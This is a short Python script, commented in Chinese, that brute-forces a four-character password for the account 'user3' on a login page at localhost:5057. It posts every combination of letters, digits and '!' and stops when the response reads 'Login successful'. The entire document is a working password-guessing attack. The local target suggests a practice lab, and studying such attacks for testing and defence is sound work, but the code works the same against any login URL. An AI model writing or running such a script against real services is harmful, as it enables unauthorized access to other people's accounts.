import requests
import itertools
import string
import sys

# 目標URL
url = "http://localhost:5057/home/login"

# 字元集：包含 A-Z, a-z, 0-9, 以及 '!'
characters = string.ascii_uppercase + string.ascii_lowercase + string.digits + '!'

# 帳號名稱
data = {
    "username": "user3",
    "password": ""
}

password_length = 4

# 暴力破解密碼
for attempt in itertools.product(characters, repeat=password_length):
    password = ''.join(attempt)
    data['password'] = password
    
    # 打印嘗試密碼並flush
    sys.stdout.write(f"\rTrying password: {password}")
    sys.stdout.flush()
    
    # 發送POST請求
    response = requests.post(url, data=data)
    
    # 檢查是否成功登錄
    if "Login successful" in response.text:  # 假設成功登錄後的回應中有這樣的字串
        print(f"\nPassword found: {password}")
        break

print("\nPassword brute-force attack completed.")
